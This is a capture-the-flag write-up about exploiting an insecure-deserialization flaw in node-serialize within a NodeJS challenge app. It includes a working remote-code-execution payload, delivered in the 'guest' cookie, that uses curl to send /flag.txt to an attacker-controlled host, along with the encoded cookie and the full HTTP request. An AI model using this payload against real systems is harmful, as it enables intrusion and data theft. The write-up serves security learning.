---
title: "zh3r0 CTF - sParta Web Challenge"
date: 2021-9-05
layout: single
tags:
  - CTF
  - writeups
  - web security
  - application security
  - NodeJS
---
TL;DR: The challenge had an archive file which contained the source code for a NodeJS application and a Dockerfile. Running docker build invokes npm commands, which revealed a clue which led to finding out the application was vulnerable to [Insecure Deserialization](https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization). The malicious input was sent via a cookie called "guest" which led into an RCE and the eventual capture of the challenge's flag.

## Quick disclaimer

My writeups are intended to showcase my understanding of various security concepts and my thought process when solving a problem. Hopefully they would also improve my technical-writing skills, which I believe is an extremely underrated skill in our industry. I also share some analysis of vulnerabilites and sometimes what can be done to resolve or mitigate them. These are not intended to be tutorials or walkthroughs.

---

## Challenge file

[zh3r0 CTF](https://ctftime.org/event/1285/) was the 2nd CTF I participated with, and "sParta" was a Web challenge and included a downloadable archive containing a NodeJS project. Let's start by extracting the archive and looking at the contents:

```bash
pidnull💀kali:public$ tree
.
├── Dockerfile
├── files
│   ├── package.json
│   ├── public
│   │   ├── guest.html
│   │   ├── login.css
│   │   ├── sparta_guest.jpg
│   │   └── sparta.jpg
│   ├── server.js
│   └── views
│       ├── guest.ejs
│       ├── home.ejs
│       └── loggedin.ejs
└── flag.txt

3 directories, 11 files
pidnull💀kali:public$ cat flag.txt 
zh3r0{test_flag}
pidnull💀kali:public$ 
```

`Dockerfile` is of course an interesting file:

```Dockerfile
FROM node
RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
WORKDIR /home/node/app
COPY flag.txt /
COPY files .
USER node
RUN npm install
COPY --chown=node:node files .
EXPOSE 7777
CMD [ "node", "server.js" ]
```

And `package.json` looked like a normal definition of packages required by the application:

```json
{
  "name": "guest",
  "version": "1.0.0",
  "description": "",
  "main": "guest.js",
  "dependencies": {
    "body-parser": "^1.19.0",
    "cookie-parser": "^1.4.5",
    "ejs": "^3.1.0",
    "express": "^4.17.1",
    "jsdom": "^16.5.3",
    "node-serialize": "^0.0.4"
  },
  "devDependencies": {},
  "scripts": {
    "start": "node server.js"
  },
  "keywords": [
    "guest"
  ],
  "author": "DreyAnd",
  "license": "ISC"
}
```

I also took a look at the `server.js` but it looked clean to my (non-developer) eyes. Pretty standard NodeJS application.

## Inspecting the source

At this point, the only thing I was able to verify is that the code will not do anything funny, so I went ahead and built the image:

```bash
pidnull💀kali:public$ docker build . -t spartaweb
Sending build context to Docker daemon  169.5kB
Step 1/10 : FROM node
 ---> 5253bf937d3e
Step 2/10 : RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
 ---> Running in 936af0e6fee8
Removing intermediate container 936af0e6fee8
 ---> dac0463cfe4a
Step 3/10 : WORKDIR /home/node/app
 ---> Running in 4dfd9661012a
Removing intermediate container 4dfd9661012a
 ---> 81b4641b1da1
Step 4/10 : COPY flag.txt /
 ---> b5a0f44cde57
Step 5/10 : COPY files .
 ---> 1b96c5865657
Step 6/10 : USER node
 ---> Running in e7543c8df502
Removing intermediate container e7543c8df502
 ---> 6fb9c3731a31
Step 7/10 : RUN npm install
 ---> Running in 0c27d94bb435

added 128 packages, and audited 129 packages in 9s

1 critical severity vulnerability

Some issues need review, and may require choosing
a different dependency.

Run `npm audit` for details.
npm notice 
npm notice New minor version of npm available! 7.21.0 -> 7.22.0
npm notice Changelog: <https://github.com/npm/cli/releases/tag/v7.22.0>
npm notice Run `npm install -g npm@7.22.0` to update!
npm notice 
Removing intermediate container 0c27d94bb435
 ---> 4d659e546dc0
Step 8/10 : COPY --chown=node:node files .
 ---> 56315022f09a
Step 9/10 : EXPOSE 7777
 ---> Running in b294995e2c14
Removing intermediate container b294995e2c14
 ---> 8bd07338443f
Step 10/10 : CMD [ "node", "server.js" ]
 ---> Running in 6fa4a87da2ee
Removing intermediate container 6fa4a87da2ee
 ---> 78d78f8c366b
Successfully built 78d78f8c366b
Successfully tagged spartaweb:latest
pidnull💀kali:public$ 
```

The following lines easily caught my eyes:

> 1 critical severity vulnerability
> 
> Some issues need review, and may require choosing
> a different dependency.

[npm audit](https://docs.npmjs.com/cli/v7/commands/npm-audit) is a handy tool to quickly identify known vulnerabilities for the packages in an NPM project. In the past, I have used it for a few projects and used to integrate it to build pipelines.

I started the application and ran an npm audit:

```bash
pidnull💀kali:public$ docker run -d -it -p 7777:7777 --name testapp spartaweb
ad8b743c3747dee6d6f96fcc8c05b274f6002267b155362c3af566237586fbc1
pidnull💀kali:public$ docker exec -it testapp /bin/bash
node@ad8b743c3747:~/app$ ls
node_modules  package-lock.json  package.json  public  server.js  views
node@ad8b743c3747:~/app$ npm audit
# npm audit report

node-serialize  *
Severity: critical
Code Execution through IIFE - https://npmjs.com/advisories/311
No fix available
node_modules/node-serialize

1 critical severity vulnerability

Some issues need review, and may require choosing
a different dependency.
node@ad8b743c3747:~/app$ 
```

This finding pointed to the following dependency:

>     "node-serialize": "^0.0.4"

Based on [npmjs.com](https://www.npmjs.com/package/node-serialize), `node-serialize` is used to "Serialize a object including it's function into a JSON".

Lastly, I checked the [advisory](https://npmjs.com/advisories/311) in the `npm audit` output:

> Affected versions of node-serialize can be abused to execute arbitrary code via an immediately invoked function expression (IIFE) if untrusted user input is passed into unserialize().

At that point, it looked like the challenge was to exploit an insecure deserialization vulnerability in the NodeJS application to gain remote code execution and retrieve the flag.

### Enumerate the application

For an insecure deserialization, obviously there had to be some kind of input to the application. So I started to look for it:

![](/assets/writeups/CTF-zh3ro-ctf-sParta/website-1.png)

Guess access seemed promising:

![](/assets/writeups/CTF-zh3ro-ctf-sParta/website-2.png)

I tried to submit the form. When the request was inspected with Burp, the request was a POST request to `/guest`:

```http
POST /guest HTTP/1.1
Host: localhost:7777
User-Agent: MY-USER-AGENT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://localhost:7777
DNT: 1
Connection: close
Referer: http://localhost:7777/guest
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

username=pidnull&country=Germany&city=Munich&message=Hi+there&submit=Add+your+info
```

I then search the section in `server.js` that handled the POST request:

```javascript
app.post('/guest', function(req, res) {
   if (req.cookies.guest) {
   	var str = new Buffer(req.cookies.guest, 'base64').toString();
   	var obj = serialize.unserialize(str);
   	if (obj.username) {
     	res.send("Hello " + escape(obj.username) + ". This page is currently under maintenance for Guest users. Please go back to the login page");
   }
 } else {
	 var username = req.body.username 
	 var country = req.body.country 
	 var city = req.body.city
	 var serialized_info = `{"username":"${username}","country":"${country}","city":"${city}"}`
     var encoded_data = new Buffer(serialized_info).toString('base64');
	 res.cookie('guest', encoded_data, {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello!");
});
```

Based on the code above, the `unserialize` function, which was my target, receives the unsanitized base64-decoded value from the "guest" cookie. I also knew that the payload has to be sent with the cookie. I then had to read more on the vulnerability and how to generate the exploit.

## The vulnerability

So I checked again on the URL referenced by the advisory: [Exploiting Node.js deserialization bug for Remote Code Execution](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)

At the time of the CTF, I already had experience with exploiting Insecure Deserialization vulnerabilities (with Java and PHP applications), which mainly works due to unsanitized input prior to deserialization. For this research, I only needed the payload to pass as the `guest` cookie to the `unserialize()` function. After reading the blog post, I came up with the following payload, which includes a simple curl command that sends the flag file's contents within a GET request to a server I control:

The URL encoding was just necessary to ensure any special characters in the flag file would not cause problems to the output.

```javascript
var payload = '{"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'curl -G --data-urlencode $(cat /flag.txt) http://MY-IP\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
console.log(new Buffer(payload).toString('base64'));
```

To generate the base64 payload:

```bash
pidnull💀kali:public$ node payload.js 
eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLUcgLS1kYXRhLXVybGVuY29kZSAkKGNhdCAvZmxhZy50eHQpIGh0dHA6Ly8xMC4xMC4xNi4xMjo4MDAwJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7fSgpIn0=
(node:14189) [DEP0005] DeprecationWarning: Buffer() is deprecated due to security and usability issues. Please use the Buffer.alloc(), Buffer.allocUnsafe(), or Buffer.from() methods instead.
pidnull💀kali:public$ 
```

### The exploit

Finally, all I had to do was start my listener, then send the HTTP request:

```http
POST /guest HTTP/1.1
Host: localhost:7777
User-Agent: MY-USER-AGENT
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://localhost:7777
DNT: 1
Connection: close
Referer: http://localhost:7777/guest
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cookie: guest=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgLUcgLS1kYXRhLXVybGVuY29kZSAkKGNhdCAvZmxhZy50eHQpIGh0dHA6Ly8xMC4xMC4xNi4xMjo4MDAwJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7IGNvbnNvbGUubG9nKHN0ZG91dCkgfSk7fSgpIn0=

username=pidnull&country=Germany&city=Munich&message=Hi+there&submit=Add+your+info
```

Result:

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.17.0.2 - - [05/Sep/2021 22:51:34] "GET /?zh3r0%7Btest_flag%7D HTTP/1.1" 200 -
```

Sent the payload to the actual CTF URL, and I got the flag.
